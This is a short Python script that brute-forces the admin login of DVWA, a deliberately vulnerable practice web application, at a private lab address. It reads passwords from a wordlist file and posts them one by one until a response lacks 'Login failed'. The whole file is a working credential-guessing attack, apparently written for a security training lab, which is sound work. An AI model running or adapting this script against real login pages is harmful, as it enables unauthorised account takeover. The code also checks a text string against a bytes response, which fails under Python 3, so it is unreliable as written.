#! /usr/bin/env python

import requests

target_url = 'http://10.0.2.17/dvwa/login.php'
data_dict = {'username': 'admin', 'password': '', 'Login': 'submit'}


with open('password.txt', 'r') as password_list:
    for password in password_list:
        word = password.strip()
        data_dict['password'] = word
        response = requests.post(target_url, data=data_dict)
        if 'Login failed' not in response.content:
            print('[+] Got password --> ' + word)
            exit()

print('[-] Password not found.')

